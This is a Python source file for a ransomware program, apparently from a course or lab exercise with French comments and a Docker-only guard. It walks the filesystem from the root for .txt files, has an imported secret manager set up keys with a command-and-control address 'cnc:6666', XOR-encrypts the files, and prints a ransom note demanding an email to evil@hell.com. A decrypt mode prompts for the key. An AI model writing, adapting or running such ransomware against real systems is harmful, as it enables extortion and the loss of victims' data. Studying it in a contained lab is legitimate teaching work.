import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""

DECRYPT_MESSAGE = """
 _____ _ _             ____                             _           _ 
|  ___(_) | ___  ___  |  _ \  ___  ___ _ __ _   _ _ __ | |_ ___  __| |
| |_  | | |/ _ \/ __| | | | |/ _ \/ __| '__| | | | '_ \| __/ _ \/ _` |
|  _| | | |  __/\__ \ | |_| |  __/ (__| |  | |_| | |_) | ||  __/ (_| |
|_|   |_|_|\___||___/ |____/ \___|\___|_|   \__, | .__/ \__\___|\__,_|
                                            |___/|_| 
"""

class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self) -> None:
        """
        Vérifie si le programme s'exécute bien dans un environnement Docker.
        Si ce n'est pas le cas, le programme s'arrête.
        """
        hostname = socket.gethostname()
        if not re.match("[0-9a-f]{6,6}", hostname):
            print(f"Erreur : Ce programme doit être exécuté dans un conteneur Docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, file_filter: str) -> list:
        """
        Recherche tous les fichiers correspondant au filtre donné.
        Retourne une liste des chemins absolus.
        """
        base_path = Path("/")
        return [str(f) for f in base_path.rglob(file_filter)]

    def encrypt(self):
        """
        Fonction principale pour chiffrer les fichiers :
        - Trouver tous les fichiers .txt
        - Générer la clé et le token
        - Chiffrer les fichiers
        - Afficher le message de rançon
        """
        txt_files = self.get_files("*.txt")

        # Création du gestionnaire de secrets
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
        secret_manager.setup()

        # Chiffrement des fichiers trouvés
        secret_manager.xor_files(txt_files)

        # Récupération et affichage du token
        token = secret_manager.get_hex_token()
        print(ENCRYPT_MESSAGE.format(token=token))

    def decrypt(self):
        """
        Fonction principale pour déchiffrer les fichiers :
        - Demande la clé à l'utilisateur
        - Vérifie si la clé est correcte
        - Déchiffre les fichiers
        - Supprime les fichiers temporaires
        """
        # Initialisation du gestionnaire de secrets
        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)

        # Chargement des éléments cryptographiques locaux
        secret_manager.load()

        # Recherche des fichiers chiffrés
        txt_files = self.get_files("*.txt")

        while True:
            try:
                # Demande à l'utilisateur d'entrer la clé de déchiffrement
                entered_key = input("Entrez la clé pour déchiffrer vos fichiers : ")

                # Vérification et application de la clé
                secret_manager.set_key(entered_key)

                # Déchiffrement des fichiers
                secret_manager.xor_files(txt_files)

                # Nettoyage des traces locales
                secret_manager.clean()

                # Confirmation de la réussite
                print(DECRYPT_MESSAGE)

                # Sortie du programme
                break
            except ValueError as error:
                print(f"Erreur : {error}. Clé invalide. Veuillez réessayer.")

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)

    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()


